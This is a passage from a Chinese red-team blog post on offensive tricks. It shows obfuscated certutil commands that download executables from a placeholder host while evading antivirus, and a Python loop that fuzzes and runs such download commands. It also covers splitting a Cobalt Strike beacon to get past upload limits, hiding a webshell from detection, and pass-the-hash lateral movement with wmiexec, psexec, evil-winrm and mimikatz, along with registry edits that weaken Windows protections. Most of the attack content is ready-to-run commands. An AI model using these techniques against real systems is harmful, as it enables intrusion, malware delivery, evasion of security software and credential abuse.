+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;,@certutil  -u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot;&quot; -split -f http://x.x.x.x/a.exe -DeleteHelloContainer</span><br><span class="line">;,@certutil  -u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot;&quot; -split  -f http://x.x.x.x/a.exe -deleteEnrollmentServer</span><br><span class="line">;,@certutil  -u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot;&quot; -split  -f http://x.x.x.x/a.exe -deletePolicyServer</span><br><span class="line">;,@certutil  -u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot;&quot; -split  -f http://x.x.x.x/a.exe -deleteEccCurve</span><br><span class="line"></span><br><span class="line">move -deleteEccCurve test.exe</span><br></pre></td></tr></table></figure>
+
+<h5 id="def"><a href="#def" class="headerlink" title="def"></a>def</h5><p>中间插入“”字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cert^u^t^il -url&quot;&quot;&quot;&quot;cache -sp&quot;&quot;&quot;&quot;lit -f http://192.168.xx.xx:7070/test.txt</span><br></pre></td></tr></table></figure>
+
+<p>通用：可通过py编写脚本 fuzz 字符寻找可绕过的语句</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert_random_chinese_chars</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;在字符串s中随机插入中文字符&quot;&quot;&quot;</span></span><br><span class="line">    chinese_chars = [<span class="string">&quot;。&quot;</span>, <span class="string">&quot;，&quot;</span>, <span class="string">&quot;！&quot;</span>,<span class="string">&quot;》&quot;</span>,<span class="string">&quot;？&quot;</span>,<span class="string">&quot;《&quot;</span>, <span class="string">&quot;，&quot;</span>, <span class="string">&quot;】&quot;</span>,<span class="string">&quot;【&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;“&quot;</span>]</span><br><span class="line">    n = <span class="built_in">len</span>(s)</span><br><span class="line">    insert_positions = <span class="built_in">sorted</span>(random.sample(<span class="built_in">range</span>(n), n // <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">reversed</span>(insert_positions):</span><br><span class="line">        s = s[:pos] + random.choice(chinese_chars) + s[pos:]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;urlcache&quot;</span></span><br><span class="line">    url = insert_random_chinese_chars(url)</span><br><span class="line">    command = <span class="string">f&quot;certutil -<span class="subst">&#123;url&#125;</span> -split -f http://x.x.x.x/1.png&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(command + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    os.system(command)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230403173322974.png" alt="image-20230403173322974"></p>
+<h4 id="绕过限制上线"><a href="#绕过限制上线" class="headerlink" title="绕过限制上线"></a>绕过限制上线</h4><p>通过漏洞获取到一个webshell之后，在某些环境下可能会限制上传文件的大小和后缀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -encode beacon.exe out.txt </span><br><span class="line">certutil -decode out.txt test.exe</span><br></pre></td></tr></table></figure>
+
+<p>测试找到上传的最大的长度，使用工具进行文本切割</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324142152512.png" alt="image-20230324142152512"></p>
+<p>重新整合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 01.txt + 02.txt + 03.txt + 04.txt + 05.txt + 06.txt + 07.txt + 08.txt + 09.txt + 10.txt out.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324144413900.png" alt="image-20230324144413900"></p>
+<p>成功上线</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324144529590.png" alt="image-20230324144529590"></p>
+<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><p>通过1day上传文件大概率会碰到被waf拦截的情况，可添加脏字符进行绕过，或者结合分块传输</p>
+<p>上传的webshell木马最好做免杀处理，如哥斯拉木马可进行unicode编码，仍可正常执行</p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20230324160939243.png" alt="image-20230324160939243"></p>
+<h3 id="绕杀软添加用户"><a href="#绕杀软添加用户" class="headerlink" title="绕杀软添加用户"></a>绕杀软添加用户</h3><p>使用bof加载绕过</p>
+<img src="/images/image-20230505153739421.png" alt="image-20230505153739421" style="zoom:67%;" />
+
+<img src="/images/image-20230505153754607.png" alt="image-20230505153754607" style="zoom:80%;" />
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inline-execute C:\Users\MSI-NB\Desktop\BOF过杀软添加用户\bof-net-user-x64.o</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230505153827383.png" alt="image-20230505153827383"></p>
+<p><img src="/images/image-20230505153837709.png" alt="image-20230505153837709"></p>
+<h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>railgun、crackmapexec</p>
+<h3 id="获取密码控制机器"><a href="#获取密码控制机器" class="headerlink" title="获取密码控制机器"></a>获取密码控制机器</h3><h4 id="135端口"><a href="#135端口" class="headerlink" title="135端口"></a>135端口</h4><p><a target="_blank" rel="noopener" href="https://github.com/XiaoliChan/wmiexec-Pro">https://github.com/XiaoliChan/wmiexec-Pro</a></p>
+<p>执行命令</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec-pro.py administrator:Admin12345@192.168.186.136 exec-command -command &quot;whoami&quot; -with-output</span><br></pre></td></tr></table></figure>
+
+<img src="/images/image-20230505153922685.png" alt="image-20230505153922685" style="zoom:67%;" />
+
+<p>上传文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec-pro.py administrator:Admin12345@192.168.186.136 filetransfer -upload -src-file &quot;/root/Desktop/decode.exe&quot; -dest-file &quot;C:\users\public\test.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230505153909784.png" alt="image-20230505153909784"></p>
+<p>wmiexec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes :2687cb433215956d4ededb0d00334118 Tom@192.168.0.220</span><br><span class="line">wmiexec.exe -hashes :2687cb433215956d4ededb0d00334118 Tom@192.168.0.220</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220610140854546.png" alt="image-20220610140854546"></p>
+<p>这里过不去的需要在目标机器上开启注册表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220610142601778.png" alt="image-20220610142601778"></p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220610141220407.png" alt="image-20220610141220407"></p>
+<p>WMIHACKER</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript WMIHACKER.vbs /cmd 192.168.10.90 administrator &quot;123456&quot; &quot;ipconfig&quot; 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220816164203617.png" alt="image-20220816164203617"></p>
+<p>sharpwmi</p>
+<p>个人常用的一款，可以上传文件，但是文件大小限制512kb内</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/sharpwmi">https://github.com/QAX-A-Team/sharpwmi</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/idiotc4t/sharpwmi">https://github.com/idiotc4t/sharpwmi</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sharpwmi.exe login 192.168.2.3 administrator 123 cmd whoami</span><br><span class="line">sharpwmi.exe login 192.168.2.3/24 administrator 123 cmd whoami</span><br><span class="line">sharpwmi.exe login 192.168.2.3-23 administrator 123 upload beacon.exe c:\beacon.exe</span><br><span class="line">sharpwmi.exe pth 192.168.2.3-192.168.2.77 cmd whoami</span><br><span class="line">sharpwmi.exe pth 192.168.2.3/255.255.255.0 upload beacon.exe c:\beacon.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220915162957578.png" alt="image-20220915162957578"></p>
+<h4 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h4><p>smbexec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe administrator:&quot;mima&quot;@10.61.9.46</span><br></pre></td></tr></table></figure>
+
+<p>psexec</p>
+<p>这里使用的impacket工具包里的，微软自带的psexec不能使用hash进行传递</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.61.9.45\ipc$ &quot;123456&quot; /user:administrator</span><br><span class="line">psexec.exe \\10.61.9.45 -u administrator -p &quot;mima&quot; whoami</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py -hashes :ccef208c6485269c20db2cad21734fe7 administrator@192.168.0.100</span><br><span class="line">psexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 administrator@192.168.0.100</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220624115318502.png" alt="image-20220624115318502"></p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220624143404133.png" alt="image-20220624143404133"></p>
+<p>mmcexec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmcexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 administrator@192.168.0.100</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220624142529053.png" alt="image-20220624142529053"></p>
+<h4 id="3389端口"><a href="#3389端口" class="headerlink" title="3389端口"></a>3389端口</h4><p>修改注册表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>mimikatz进行hash传递，之后会弹出一个框，填入相应的IP即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:dyy /domain:. /ntlm::2687cb433215956d4ededb0d00334118 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220624090235257.png" alt="image-20220624090235257"></p>
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220624090530776.png" alt="image-20220624090530776"></p>
+<h4 id="5985端口"><a href="#5985端口" class="headerlink" title="5985端口"></a>5985端口</h4><p>evil-winrm</p>
+<p>这里先安装ruby环境，<a target="_blank" rel="noopener" href="https://rubyinstaller.org/">https://rubyinstaller.org</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install evil-winrm</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 192.168.0.100 -u administrator -H ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://photoscloud.oss-cn-shanghai.aliyuncs.com/image-20220624154730524.png" alt="image-20220624154730524"></p>
+<p>报错异常情况</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">错误号<span class="number">5</span>，拒绝访问：很可能你使⽤的⽤户不是管理员权限的（#先提升权限）</span><br><span class="line">错误号<span class="number">51</span>，Windows⽆法找到⽹络路径（#⽹络有问题）</span><br><span class="line">错误号<span class="number">53</span>，找不到⽹络路径:ip地址错误;⽬标末开机（#⽬标lanmanserver服务未启动；⽬标有</span><br><span class="line">防⽕墙（端⼝过滤）</span><br><span class="line">错误号<span class="number">67</span>，找不到⽹络名（#你的lanmanworkstation服务末启动;⽬标删除了ipc$）</span><br><span class="line">错误号<span class="number">1219</span>，提供的凭据与⼰存在的凭据集冲突（#你已经和对⽅建⽴了⼀个ipc$，请删除在连）</span><br><span class="line">错误号<span class="number">1326</span>，未知的⽤户名或错误密码（#原因很明显）</span><br><span class="line">错误号<span class="number">1792</span>，试图登录，但是⽹络登录服务没有启动（#⽬标NetLogon服务末启动。（连接域控</span><br><span class="line">会出现此情况）</span><br><span class="line">错误号<span class="number">2242</span>，此⽤户的密码⼰经过期（#⽬标有帐号策略，强制定期要求更改密码）</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Hyyrent</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://pizz33.github.io/posts/5a4172515764/">https://pizz33.github.io/posts/5a4172515764/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://pizz33.github.io" target="_blank">Hyyrent blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a></div><div class="post_share"><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-62b2c7859b5e4497" async="async"></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/ffbd3579f38f/"><img class="next-cover" src="/img/1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">红队技术-隐藏上传的程序木马</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/eed1e7f3c4a0/" title="红队技术-Cobaltstrike之Linux上线"><img class="cover" src="/img/14.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-07</div><div class="title">红队技术-Cobaltstrike之Linux上线</div></div></a></div><div><a href="/posts/624ed94435d7/" title="红队技术-Vcenter实战利用方式总结"><img class="cover" src="/img/2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-18</div><div class="title">红队技术-Vcenter实战利用方式总结</div></div></a></div><div><a href="/posts/81b25cba1c98/" title="红队技术-weblogic上传getshell路径"><img class="cover" src="/img/5.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-17</div><div class="title">红队技术-weblogic上传getshell路径</div></div></a></div><div><a href="/posts/149bd738d2d0/" title="红队技术-上线机器微信聊天记录提取"><img class="cover" src="/img/14.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-28</div><div class="title">红队技术-上线机器微信聊天记录提取</div></div></a></div><div><a href="/posts/1babba03ba54/" title="红队技术-免杀木马捆绑器分享"><img class="cover" src="/img/15.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">红队技术-免杀木马捆绑器分享</div></div></a></div><div><a href="/posts/a6c7d1ac17d4/" title="红队技术-各端口横向移动方法"><img class="cover" src="/img/13.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-10</div><div class="title">红队技术-各端口横向移动方法</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Hyyrent</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" href="https://pizz33.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Pizz33/" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%B5%8B%E7%BB%98%E4%B8%89%E5%89%91%E5%AE%A2"><span class="toc-number">1.1.</span> <span class="toc-text">资产测绘三剑客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E9%AB%98%E4%BB%B7%E5%80%BC%E8%B5%84%E4%BA%A7"><span class="toc-number">1.2.</span> <span class="toc-text">挖掘高价值资产</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">shiro利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E5%B0%91%E5%8F%8C%E5%9B%A0%E5%AD%90%E7%88%86%E7%A0%B4"><span class="toc-number">1.4.</span> <span class="toc-text">缺少双因子爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.5.</span> <span class="toc-text">源代码泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.6.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webpack%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.7.</span> <span class="toc-text">webpack接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%8B%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.8.</span> <span class="toc-text">弱口令＋后台上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nacos%E5%BC%80%E6%94%BE%E5%85%AC%E7%BD%91"><span class="toc-number">1.9.</span> <span class="toc-text">nacos开放公网</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">横向利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cobaltstrike%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.1.</span> <span class="toc-text">cobaltstrike上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8FC2%E5%9C%B0%E5%9D%80"><span class="toc-number">2.2.</span> <span class="toc-text">隐藏C2地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.2.1.</span> <span class="toc-text">常规上线</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.2.2.</span> <span class="toc-text">绕杀软上线</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%81%AB%E7%BB%92"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">火绒</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#360"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">360</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#def"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">def</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.2.3.</span> <span class="toc-text">绕过限制上线</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">文件上传绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-number">2.4.</span> <span class="toc-text">绕杀软添加用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">2.5.</span> <span class="toc-text">密码喷洒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E6%8E%A7%E5%88%B6%E6%9C%BA%E5%99%A8"><span class="toc-number">2.6.</span> <span class="toc-text">获取密码控制机器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#135%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.6.1.</span> <span class="toc-text">135端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.6.2.</span> <span class="toc-text">445端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3389%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.6.3.</span> <span class="toc-text">3389端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5985%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.6.4.</span> <span class="toc-text">5985端口</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/5a4172515764/" title="红队技术-攻防实战小技巧"><img src="/img/13.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红队技术-攻防实战小技巧"/></a><div class="content"><a class="title" href="/posts/5a4172515764/" title="红队技术-攻防实战小技巧">红队技术-攻防实战小技巧</a><time datetime="2023-05-05T07:40:07.000Z" title="发表于 2023-05-05 15:40:07">2023-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ffbd3579f38f/" title="红队技术-隐藏上传的程序木马"><img src="/img/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红队技术-隐藏上传的程序木马"/></a><div class="content"><a class="title" href="/posts/ffbd3579f38f/" title="红队技术-隐藏上传的程序木马">红队技术-隐藏上传的程序木马</a><time datetime="2023-05-04T07:58:55.000Z" title="发表于 2023-05-04 15:58:55">2023-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4ac17cb886a9/" title="免杀技术-go shellcode加载bypassAV"><img src="/img/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="免杀技术-go shellcode加载bypassAV"/></a><div class="content"><a class="title" href="/posts/4ac17cb886a9/" title="免杀技术-go shellcode加载bypassAV">免杀技术-go shellcode加载bypassAV</a><time datetime="2023-04-18T10:01:47.000Z" title="发表于 2023-04-18 18:01:47">2023-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9ac8b6d8793c/" title="漏洞复现-Minio信息泄露漏洞（CVE-2023-28432）"><img src="/img/9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="漏洞复现-Minio信息泄露漏洞（CVE-2023-28432）"/></a><div class="content"><a class="title" href="/posts/9ac8b6d8793c/" title="漏洞复现-Minio信息泄露漏洞（CVE-2023-28432）">漏洞复现-Minio信息泄露漏洞（CVE-2023-28432）</a><time datetime="2023-03-29T03:37:28.000Z" title="发表于 2023-03-29 11:37:28">2023-03-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/399093e579a0/" title="靶场学习-自建三层内网靶场"><img src="/img/13.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="靶场学习-自建三层内网靶场"/></a><div class="content"><a class="title" href="/posts/399093e579a0/" title="靶场学习-自建三层内网靶场">靶场学习-自建三层内网靶场</a><time datetime="2023-03-17T01:50:16.000Z" title="发表于 2023-03-17 09:50:16">2023-03-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/13.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Hyyrent</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://pizz33.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" 